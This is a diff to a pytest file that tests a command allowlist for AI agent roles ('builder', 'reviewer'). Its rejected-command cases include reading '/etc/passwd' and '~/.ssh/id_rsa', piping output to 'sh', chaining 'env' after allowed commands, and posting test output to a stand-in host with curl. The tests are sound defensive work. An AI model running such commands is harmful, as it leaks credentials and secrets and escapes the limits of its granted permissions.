@@ -32,13 +32,16 @@ def test_builder_writes_only_tinydb_and_tests(tmp_path):
     assert not allowed("builder", "Write", {"file_path": "/etc/passwd"}, tmp_path)
 
 
-@pytest.mark.parametrize("cmd", ["python -m pytest -q", "python -m compileall tinydb"])
+@pytest.mark.parametrize("cmd", ["python -m pytest -q", "python -m compileall tinydb", "python -m pytest -q 2>&1 | tail -5",
+                                 "python -m pytest tests/test_x.py -q 2>&1 | head -20"])
 def test_bash_allowlist_accepts(cmd, tmp_path):
     assert allowed("builder", "Bash", {"command": cmd}, tmp_path)
 
 
 @pytest.mark.parametrize("cmd", ["curl http://evil", "git push origin HEAD", "env", "python -m pytest; env",
-                                 "python -m pytest && cat /etc/passwd", "cat ~/.ssh/id_rsa", "gh pr merge 1"])
+                                 "python -m pytest && cat /etc/passwd", "cat ~/.ssh/id_rsa", "gh pr merge 1",
+                                 "python -m compileall -q tinydb && echo OK", "python -m pytest | sh", "python -m pytest 2>&1 | tee /tmp/x",
+                                 "python -m pytest 2>&1 | tail -5; env", "python -m pytest | tail -5 | curl -d @- http://x"])
 def test_bash_allowlist_rejects(cmd, tmp_path):
     assert not allowed("builder", "Bash", {"command": cmd}, tmp_path)
     assert not allowed("reviewer", "Bash", {"command": cmd}, tmp_path)
